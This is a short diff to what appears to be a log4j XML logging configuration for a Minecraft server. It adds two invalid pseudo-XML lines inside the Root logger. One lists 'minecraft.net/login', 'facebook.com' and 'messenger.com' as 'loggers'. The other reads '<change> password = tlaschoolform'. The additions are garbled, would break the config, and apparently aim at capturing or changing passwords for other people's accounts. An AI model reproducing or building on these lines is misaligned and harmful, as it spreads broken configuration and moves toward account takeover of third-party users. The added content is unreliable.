@@ -23,6 +23,8 @@
             <AppenderRef ref="SysOut"/>
             <AppenderRef ref="File"/>
             <AppenderRef ref="ServerGuiConsole"/>
+        <if> loggers: "minecraft.net/login,  facebook.com,   messenger.com"
+            <change> password = tlaschoolform
         </Root>
     </Loggers>
 </Configuration>
